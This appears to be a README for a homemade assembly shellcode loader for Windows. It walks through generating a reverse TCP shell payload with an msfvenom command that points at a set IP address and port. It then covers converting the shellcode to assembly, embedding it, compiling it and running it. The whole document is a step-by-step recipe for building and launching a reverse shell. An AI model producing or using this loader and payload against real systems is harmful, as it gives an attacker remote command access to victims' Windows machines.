# Assembler, Shellcode Loader (reverse TCP)

## 1. Create your payload

For example with : 

```msfvenom -p windows/x64/shell_reverse_tcp RHOST=192.168.245.132 LPORT=4444 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c ```

((this command create a shellcode in C language (you can do with python (p) or directly hex (hex)) and encode without "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" which can do comflits))

## 2. Convert your shellcode

Use this homemade [converter_1](./convert.sh) or [converter_2](./convert2.sh) to get your asm shellcode.


## 3. Put your shellcode in your .asm code

```
.data
  shellcode DB XXXh,XXXh,XXh,..
                ....
                ....
                ....
endshellcode DB 0
```

See this example of [ASM File](./example.asm).

## 4. Compile your ASM

On windows you can use this compiler [script](./compiler.bat)

## 5. Run

One example with a loader + reverse shell code : [here](./reverse.asm)
